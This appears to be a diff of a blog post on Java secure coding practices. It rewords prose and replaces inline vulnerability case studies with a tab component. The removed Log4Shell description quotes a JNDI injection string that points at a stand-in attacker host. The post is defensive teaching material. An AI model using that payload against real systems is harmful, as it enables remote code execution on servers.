@@ -14,11 +14,13 @@ heroImage: ""
 language: "en"
 ---
 
+import SecurityCaseStudyTabs from '../../components/blog/SecurityCaseStudyTabs.astro';
+
 ## Overview
 
-Security vulnerabilities are expensive. The cost isn't just in engineering hours to patch — it's the intermediate response (incident management, migration, detection), and the damage to reputation that follows. The earlier we catch vulnerabilities in the SDLC, the cheaper they are to fix.
+Security vulnerabilities are expensive. The cost goes beyond engineering hours to patch — there's the intermediate response (incident management, migration, detection), and the reputation damage that follows. The earlier we catch vulnerabilities in the SDLC, the cheaper they are to fix.
 
-I've been digging into secure coding practices for Java, and this post is a summary of what I've learned — covering the types of vulnerabilities, where they come from, how to address them at each phase of the SDLC, and real-world cases that show why this matters.
+In this post, I'll walk through the types of vulnerabilities we see in Java applications, where they come from, how to address them at each phase of the SDLC, and real-world cases that show why these practices matter.
 
 ---
 
@@ -68,9 +70,9 @@ Security shouldn't be an afterthought bolted on at the end. Each phase of the SD
 
 ## Oracle's Secure Coding Guidelines for Java SE
 
-Oracle maintains a set of [Secure Coding Guidelines for Java SE](https://www.oracle.com/java/technologies/javase/seccodeguide.html) that covers both general and Java-specific practices. It's not meant to be comprehensive or a tutorial — it's a living reference that gets updated as new problems surface and new security features land (like JEP 486 to permanently disable the Security Manager).
+Oracle maintains a set of [Secure Coding Guidelines for Java SE](https://www.oracle.com/java/technologies/javase/seccodeguide.html) that covers both general and Java-specific practices. It's a living reference that gets updated as new problems surface and new security features land (like JEP 486 to permanently disable the Security Manager).
 
-Here are the key areas I found most relevant:
+Here are the key areas worth highlighting:
 
 ### 1. Input Validation
 
@@ -114,7 +116,7 @@ public Path resolveSafePath(String userInput, Path baseDir) {
 
 ### 2. Injection and Inclusion
 
-This is the category behind most of the high-profile vulnerabilities. The core problem: treating untrusted data as executable instructions.
+This is the category behind most high-profile vulnerabilities. The core problem: treating untrusted data as executable instructions.
 
 **SQL Injection:**
 
@@ -152,7 +154,7 @@ public void convertFile(String filename) {
 **XML External Entity (XXE) Prevention:**
 
 ```java
-// Good — disable external entities to prevent XXE attacks
+// Disable external entities to prevent XXE attacks
 import javax.xml.parsers.DocumentBuilderFactory;
 
 DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
@@ -249,53 +251,9 @@ The Security Manager has been deprecated for removal (JEP 486, finalized in JDK 
 
 ## Real-World Vulnerability Case Studies
 
-These cases illustrate why secure coding guidelines exist. Each one maps directly back to a guideline violation.
+These cases illustrate why secure coding guidelines exist. Each one maps directly back to a guideline violation. Click through each tab to see the details:
 
-### Log4Shell — CVE-2021-44228 (December 2021)
-
-Apache Log4j 2.x supported JNDI lookups in log message format strings. An attacker could inject `${jndi:ldap://attacker.com/exploit}` into any logged input — HTTP headers, form fields, user agents. Log4j would resolve this via JNDI, connecting to the attacker's LDAP server, which could return a serialized Java object achieving remote code execution.
-
-**Guideline violated**: Injection/Inclusion — user input was interpreted as a format expression. A logging library had no business resolving JNDI lookups from logged data.
-
-### Confluence OGNL Injection — CVE-2021-26084 (August 2021)
-
-Atlassian Confluence Server allowed unauthenticated OGNL expression injection. OGNL is a Java expression language, and crafted HTTP requests to certain endpoints could inject arbitrary expressions that executed Java code on the server.
-
-**Guideline violated**: Injection/Inclusion — untrusted input was passed directly to an expression language evaluator without sanitization or sandboxing.
-
-### Cobalt Strike XSS (2022)
-
-Cobalt Strike, a red team simulation tool, had an XSS vulnerability in its client. The client uses Swing, which renders HTML — so attacker-controlled HTML could be injected and rendered in the UI.
-
-**Guideline violated**: Input Validation — untrusted data rendered as HTML in a Swing component without escaping.
-
-### Text4Shell — CVE-2022-42889 (October 2022)
-
-Apache Commons Text's `StringSubstitutor` supported interpolation prefixes like `${script:...}`, `${dns:...}`, and `${url:...}`. If user-controlled input was passed through `StringSubstitutor.replace()`, attackers could trigger script execution or DNS lookups.
-
-Same class of flaw as Log4Shell — treating data as code through string interpolation.
-
-**Guideline violated**: Injection/Inclusion — string interpolation on untrusted input.
-
-### XZ Utils Backdoor — CVE-2024-3094 (March 2024)
-
-A supply chain attack where a malicious maintainer spent ~2 years gaining trust as an xz-utils contributor, then inserted a backdoor into the build process. Obfuscated binary test files were committed, and a modified `configure` script extracted malicious code into `liblzma`. This code hooked into `sshd` (via systemd's dependency on lzma), intercepting RSA key verification to allow unauthorized remote access.
-
-Discovered by Andres Freund who noticed SSH latency anomalies.
-
-**Lesson**: Supply chain security — code review of build scripts and binary test fixtures, reproducible builds, limiting trust in single maintainers.
-
-### Deserialization Vulnerabilities — 2025
-
-SAP NetWeaver (CVE-2025-31324), Cisco Unified Contact Center, NetIQ, SolarWinds — all hit by deserialization vulnerabilities in 2025. The SAP case was particularly severe (CVSS 10.0): an unauthenticated endpoint accepted serialized Java objects without filtering, leading to remote code execution.
-
-**Guideline violated**: Serialization/Deserialization — no `ObjectInputFilter`, no authentication on endpoints accepting serialized data.
-
-### npm Packages Compromise (2025)
-
-Phishing attacks targeting npm package maintainers, leading to compromised packages in the ecosystem.
-
-**Lesson**: Dependency management and supply chain security. Verify package integrity, use lockfiles, audit dependencies regularly.
+<SecurityCaseStudyTabs />
 
 ---
 
